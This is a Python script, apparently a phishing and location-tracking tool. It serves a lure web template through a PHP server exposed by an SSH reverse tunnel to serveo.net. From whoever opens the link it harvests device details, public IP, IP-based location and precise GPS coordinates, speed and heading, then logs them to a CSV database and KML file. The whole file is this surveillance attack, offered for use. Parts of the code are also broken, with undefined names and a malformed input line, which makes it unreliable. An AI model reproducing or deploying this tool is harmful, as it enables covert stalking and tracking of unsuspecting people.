#!/usr/bin/env python3

import os
import sys
import time
import csv
import argparse
import subprocess
import requests
import json
import shutil
import quo



wdir = os.getcwd()
cc = quo.Console()

quo.echo(f"[+]", fg="vgreen", bold=True, nl=False)
quo.echo(f" Checking Dependencies", fg="vcyan", nl=False)
quo.echo(f".", fg="vred", nl=False)
time.sleep(0.4)
quo.echo(f".", fg="vyellow", nl=False)
time.sleep(0.4)
quo.echo(f".", fg="vblue")
time.sleep(0.4)
cc.log("Done")

pkgs = [
        "python3",
        "pip3",
        "php",
        "ssh"
        ]
inst = True
for pkg in pkgs:
    present = shutil.which(pkg)
    if present == None:
        quo.echo(f"[x]", fg="vgreen", bold=True, nl=False)
        quo.echo(f" {pkg}", fg="black", bg="vcyan", nl=False)
        quo.echo(f" is not installed!", fg="vred")
        inst = False
    else:
        pass

if inst == False:
    exit()
else:
    pass

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Optional )')
parser.add_argument('-k', '--kml', help='Provide KML Filename ( Optional )')
parser.add_argument('-t', '--tunnel', help='Specify Tunnel Mode [ Available : manual ]')
parser.add_argument('-p', '--port', type=int, default=8080, help='Port for Web Server [ Default : 8080 ]')

args = parser.parse_args()
subdom = args.subdomain
kml_fname = args.kml
tunnel_mode = args.tunnel
port = args.port

row = []
info = ''
result = ''
version = "2021.1"

def banner():

    table = [["Created by:", "Version"],["Gerrishon Sirere", "2021.1"]]

    quo.echo(quo.tabular(table), bold=True, fg="vblue")

def ver_check():
    tasks = [f"task {n}" for n in range(1, 2)]
    with cc.status("[bold green] ",) as status:
        while tasks:
            task = tasks.pop(0)
            time.sleep(1)
    quo.echo(f"[+]", fg="vgreen", bold=True, nl=False)
    quo.echo(f" Checking new updates...", fg="vcyan")
    cc.log("")
    ver_url = 'https://raw.githubusercontent.com/secretum-inc/invenio/main/version.txt'
    try:
        ver_rqst = requests.get(ver_url)
        ver_sc = ver_rqst.status_code

        if ver_sc == 200:
            github_ver = ver_rqst.text
            github_ver = github_ver.strip()
            if version == github_ver:
                quo.echo(f"Upto date", fg="vyellow", italic=True)
            else:
                print(">> Available : {} ".format(github_ver))
        else:
            print(">>Status : {} ".format(ver_sc))
    except Exception as e:
        print('\n' + "Exception : " + str(e))

def tunnel_select():
    if tunnel_mode == None:
        serveo()
    elif tunnel_mode == 'manual':
        quo.echo(f"[+]", fg="vgreen", bold=True, nl=False)
        quo.echo(f" Skipping", nl=False, fg="vcyan")
        quo.echo(f" Serveo, ", italic=True, fg="vyellow", nl=False, bold=True)
        quo.echo(f"start you own tunnel service manually", fg="vcyan")
    else:
        quo.echo(f"[+]", fg="vgreen", nl=False)
        quo.echo(f" Invalid Tunnel Mode Selected, Check Help [-h, --help]", fg="vcyan")
        exit()

def template_select():
    global site, info, result
  #  quo.echo(f">>", fg="vgreen", nl=False)
    print("Select a Template: ")

    with open('template/templates.json', 'r') as templ:
        templ_info = templ.read()

    templ_json = json.loads(templ_info)

    for item in templ_json['templates']:
        name = item['name']
        print("[{}]".format(templ_json['templates'].index(item)) + ' {}'.format(name))

        selected = int(input('[+]') + '\n')

    try:
        site = templ_json['templates'][selected]['dir_name']

    except IndexError:
        quo.echo(f"[-]", fg="vgreen", nl=False, bold=True)
        quo.echo(f" Invalid Input!", fg="vred")
        sys.exit()

    print('\n' + "[+]" + " Loading {} Template...".format(templ_json['templates'][selected]['name']))

    module = templ_json['templates'][selected]['module']

    if module == True:
        imp_file = templ_json['templates'][selected]['import_file']
        import importlib
        importlib.import_module('template.{}'.format(imp_file))
    else:
        pass

    info = 'template/{}/php/info.txt'.format(site)
    result = 'template/{}/php/result.txt'.format(site)

def serveo():
    global subdom
    flag = False
    quo.echo(f"[+]", fg="vgreen", bold=True, nl=False)
    quo.echo(f" Checking Serveo Status...", fg="vcyan", nl=False)
    quo.echo(f" please wait", fg="vyellow")
    cc.log("")
    try:
        time.sleep(1)
        rqst = requests.get('https://serveo.net', timeout=5)
        sc = rqst.status_code
        if sc == 200:
            quo.echo(f"<<Online>>", fg="black", bg="vyellow")
        else:
            print(">> Status : {}".format(sc))
            exit()

    except requests.ConnectionError:
        quo.echo(f"<<Offline>>", fg="black", bg="vred")
        exit()

    quo.echo(f"[+]", bold=True, fg="vgreen", nl=False)
    quo.echo(f" Getting Serveo URL...", fg="vcyan", nl=False)
    quo.echo(f" please wait", fg="vyellow")

    if subdom is None:
        with open('logs/serveo.txt', 'w') as tmpfile:
            proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '80:localhost:{}'.format(port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
    else:
        with open('logs/serveo.txt', 'w') as tmpfile:
            proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '{}.serveo.net:80:localhost:{}'.format(subdom, port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)

    while True:
        with open('logs/serveo.txt', 'r') as tmpfile:
            try:
                stdout = tmpfile.readlines()
                if flag == False:
                    for elem in stdout:
                        if 'HTTP' in elem:
                            elem = elem.split(' ')
                            url = elem[4].strip()
                            print(G + '[+]' + C + ' URL : ' + W + url + '\n')
                            flag = True
                        else:
                            pass
                elif flag == True:
                    break
            except Exception as e:
                print(e)
                pass
        time.sleep(2)

def server():
    quo.echo(f"[+]", fg="vgreen", bold=True, nl=False)
    quo.echo(f" Port: ", fg="vcyan", nl=False)
    print(str(port))
    quo.echo(f"[+]", fg="vgreen", nl=False, bold=True)
    quo.echo("Starting ", fg="vcyan", nl=False)
    quo.echo(f"PHP", fg="vyellow", bold=True, nl=False)
    quo.echo(f" server please wait",fg="vcyan")
    with open('logs/php.log', 'w') as phplog:
        subprocess.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
        time.sleep(3)
    try:
        php_rqst = requests.get('http://0.0.0.0:{}/index.html'.format(port))
        php_sc = php_rqst.status_code
        if php_sc == 200:
            quo.echo(f"Success!!", fg="black", bg="vyellow")

        else:
            quo(f"Status:", fg="black", bg="vyellow")
            print("{}".format(php_sc))
    except requests.ConnectionError:
        quo.echo(f"Failed", fg="black", bg="vred", bold=True)
        Quit()

def wait():
    printed = False
    while True:
        time.sleep(2)
        size = os.path.getsize(result)
        if size == 0 and printed == False:
            quo.echo(f"[+]", fg="vcyan", bold=True, nl=False)
            quo.echo(f" Waiting for user interaction", fg="vyellow")
            tasks = [f"task {n}" for n in range (1, 11)]
            with cc.status("[bold blue]",) as status:
                while tasks:
                    task = tasks.pop(0)
                    time.sleep(1)
            printed = True
        if size > 0:
            main()

def main():
    from quo.console.console import group
    from quo.panel import Panel

    global info, result, row, var_lat, var_lon
    try:
        row = []
        with open (info, 'r') as file2:
            file2 = file2.read()
            json3 = json.loads(file2)
            for value in json3['dev']:

                var_os = value['os']
                var_platform = value['platform']
                try:
                    var_cores = value['cores']
                except TypeError:
                    var_cores = 'Not Available'
                var_ram = value['ram']
                var_vendor = value['vendor']
                var_render = value['render']
                var_res = value['wd'] + 'x' + value['ht']
                var_browser = value['browser']
                var_ip = value['ip']

                row.append(var_os)
                row.append(var_platform)
                row.append(var_cores)
                row.append(var_ram)
                row.append(var_vendor)
                row.append(var_render)
                row.append(var_res)
                row.append(var_browser)
                row.append(var_ip)

                quo.echo(f">>", fg="vgreen", bold=True, nl=False)
                quo.echo(f" DEVICE INFO", fg="black", bg="vyellow")

                @group()
                def get_table1():
                    yield Panel(f"Operating System: {var_os}", style="on blue")
                    yield Panel(f"Platform: {var_platform}", style="on red")
                    yield Panel(f"CPU Cores: {var_cores}", style="on blue")
                    yield Panel(f"RAM: {var_ram}", style="on red")
                    yield Panel(f"GPU Vendor: {var_vendor}", style="on blue")
                    yield Panel(f"GPU: {var_render}", style="on red")
                    yield Panel(f"Resolution: {var_res}", style="on blue")
                    yield Panel(f"Browser: {var_browser}", style="on red")
                    yield Panel(f"Public IP: {var_ip}", style="on blue")


                cc.echo(Panel(get_table1()))


                rqst = requests.get('http://free.ipwhois.io/json/{}'.format(var_ip))
                sc = rqst.status_code

                if sc == 200:
                    data = rqst.text
                    data = json.loads(data)
                    var_continent = str(data['continent'])
                    var_country = str(data['country'])
                    var_region = str(data['region'])
                    var_city = str(data['city'])
                    var_org = str(data['org'])
                    var_isp = str(data['isp'])

                    row.append(var_continent)
                    row.append(var_country)
                    row.append(var_region)
                    row.append(var_city)
                    row.append(var_org)
                    row.append(var_isp)

                    
                    @group()
                    def get_table2():
                        yield Panel(f"Continent: {var_continent}", style="on yellow")
                        yield Panel(f"Country: {var_country}", style="on magenta")
                        yield Panel(f"Region: {var_region}", style="on yellow")
                        yield Panel(f"City: {var_city}", style="on magenta")
                        yield Panel(f"Organization: {var_org}", style="on yellow")
                        yield Panel(f"ISP: {var_isp}", style="on magenta")

                    cc.echo(Panel(get_table2()))
    except ValueError:
        pass

    try:
        with open (result, 'r') as file:
            file = file.read()
            json2 = json.loads(file)

            for value in json2['info']:
                var_lat = value['lat'] + ' deg'
                var_lon = value['lon'] + ' deg'
                var_acc = value['acc'] + ' m'

                var_alt = value['alt']
                if var_alt == '':
                    var_alt = 'Not Available'

                else:
                    var_alt == value['alt'] + ' m'

                var_dir = value['dir']
                if var_dir == '':
                    var_dir = 'Not Available'
                else:
                    var_dir = value['dir'] + ' deg'

                var_spd = value['spd']
                if var_spd == '':
                    var_spd = 'Not Available'

                else:
                    var_spd = value['spd'] + ' m/s'

                row.append(var_lat)
                row.append(var_lon)
                row.append(var_acc)
                row.append(var_alt)
                row.append(var_dir)
                row.append(var_spd)

                quo.echo(f">>", fg="vgreen", nl=False, bold=True)
                quo.echo(f"LOCATION INFORMATION", bold=True, fg="black", bg="vyellow")

                @group()
                def get_table3():
                    yield Panel(f"Latitude: {var_lat}", style="on green")
                    yield Panel(f"Longitude: {var_lon}", style="on blue")
                    yield Panel(f"Altitude: {var_alt}", style="on green")
                    yield Panel(f"Accuracy: {var_acc}", style="on blue")
                    yield Panel(f"Direction: {var_dir}", style="on green")
                    yield Panel(f"Speed: {var_spd}", style="on blue")

                cc.echo(Panel(get_table3()))

    except ValueError:
        error = file
        quo.echo(f"[x]", fg="vgreen", bold=True, nl=False)
        quo.echo(f" {error}")
        repeat()


    print ('\n' + "[+]" + " Google Maps.................: " + "https://www.google.com/maps/place/" + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
    if kml_fname is not None:
        kmlout(var_lat, var_lon)

    csvout()
    repeat()


# KML is a file format used to display geographic data

def kmlout(var_lat, var_lon):
    with open('template/sample.kml', 'r') as kml_sample:
        kml_sample_data = kml_sample.read()
    kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
    kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

    with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
        kml_gen.write(kml_sample_data)

    quo.echo(f"[+]", fg="vgreen", nl=False, bold=True)
    quo.echo(f" KML file has been generated {wdir}", fg="vyellow", nl=False)
    print('/{}.kml'.format(kml_fname))

def csvout():
    global row

    with open('db/results.csv', 'a') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(row)

    quo.echo(f"[+]", fg="vgreen", bold=True, nl=False)
    quo.echo(f" New entry added in Database:", nl=False, fg="vyellow")
    quo.echo(wdir, fg="vyellow", nl=False)
    quo.echo(f" /db/results.csv", fg="vyellow")

def clear():
	global result
	with open (result, 'w+'): pass
	with open (info, 'w+'): pass

def repeat():
	clear()
	wait()
	main()

def Quit():
	global result
	with open (result, 'w+'): pass
	os.system('pkill php')
	exit()

try:
	banner()
	ver_check()
	tunnel_select()
	template_select()
	server()
	wait()
	main()

except KeyboardInterrupt:
    quo.echo(f"[!]", fg="vgreen", bold=True, nl=False)
    quo.echo(f" Keyboard Interrupt", fg="vred", bold=True)

    Quit()
